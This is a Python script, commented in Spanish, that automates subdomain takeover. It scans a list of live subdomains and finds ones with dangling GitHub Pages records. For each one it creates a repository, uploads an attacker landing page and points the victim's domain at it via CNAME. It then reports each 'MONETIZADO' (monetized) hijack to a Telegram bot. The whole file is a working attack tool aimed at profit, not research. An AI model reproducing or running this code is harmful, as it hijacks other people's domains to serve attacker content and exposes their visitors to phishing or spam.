import sqlite3
import os
import base64
import requests
# Asumiendo que fingerprint.py está en la misma carpeta 'core'
from fingerprint import check_vulnerability

DB_PATH = "database/inventory.db"
GH_USERNAME = "TU_USUARIO_DE_GITHUB" # <--- No olvides poner tu usuario real aquí

def init_db():
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    curr = conn.cursor()
    curr.execute('CREATE TABLE IF NOT EXISTS findings (domain TEXT PRIMARY KEY, service TEXT, status TEXT)')
    conn.commit()
    conn.close()

def auto_takeover_github(vulnerable_domain):
    gh_token = os.getenv("GH_PAT")
    repo_name = f"ghost-{vulnerable_domain.replace('.', '-')}"
    headers = {"Authorization": f"token {gh_token}", "Accept": "application/vnd.github.v3+json"}
    
    r = requests.post("https://api.github.com/user/repos", headers=headers, json={"name": repo_name, "auto_init": True})
    if r.status_code == 201:
        try:
            # La landing suele generarse en /dist en la raíz
            with open("dist/index.html", "rb") as f:
                content = base64.b64encode(f.read()).decode()
            requests.put(f"https://api.github.com/repos/{GH_USERNAME}/{repo_name}/contents/index.html", 
                         headers=headers, json={"message": "Ghost Deploy", "content": content})
            requests.put(f"https://api.github.com/repos/{GH_USERNAME}/{repo_name}/pages", 
                         headers=headers, json={"cname": vulnerable_domain})
            return True
        except: return False
    return False

def run_surgical_scan():
    init_db()
    if not os.path.exists("live_subs.txt"): return

    conn = sqlite3.connect(DB_PATH)
    curr = conn.cursor()

    with open("live_subs.txt", "r") as f:
        for line in f:
            domain = line.strip()
            if not domain: continue

            curr.execute("SELECT domain FROM findings WHERE domain=?", (domain,))
            if curr.fetchone(): continue

            print(f"[*] Analizando: {domain}")
            result = check_vulnerability(domain)

            if result["vulnerable"]:
                if result["service"] == "GitHub Pages":
                    if auto_takeover_github(domain):
                        msg = f"💰 *MONETIZADO:* `{domain}`\n🚀 *Servicio:* GitHub Pages"
                        requests.get(f"https://api.telegram.org/bot{os.getenv('TG_TOKEN')}/sendMessage?chat_id={os.getenv('TG_ID')}&text={msg}&parse_mode=Markdown")
                        
                        curr.execute("INSERT INTO findings VALUES (?, ?, ?)", (domain, "GitHub Pages", "MONETIZADO"))
                        conn.commit()
                        conn.close()
                        return # Detener tras el primer éxito
                else:
                    curr.execute("INSERT INTO findings VALUES (?, ?, ?)", (domain, result["service"], "VULN_MANUAL"))
            else:
                curr.execute("INSERT INTO findings VALUES (?, ?, ?)", (domain, "N/A", "SAFE"))
            
            conn.commit()
    conn.close()

if __name__ == "__main__":
    run_surgical_scan()
